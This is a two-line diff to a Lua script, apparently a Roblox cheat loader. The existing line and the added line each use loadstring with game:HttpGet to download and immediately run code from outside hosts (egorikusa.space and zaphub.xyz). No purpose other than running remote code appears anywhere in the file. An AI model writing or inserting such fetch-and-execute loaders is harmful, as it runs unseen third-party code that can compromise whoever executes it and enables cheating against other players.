@@ -1,1 +1,2 @@
 loadstring(game:HttpGet("https://egorikusa.space/9090bbcf4666c917100e5a48.lua", true))()
+loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
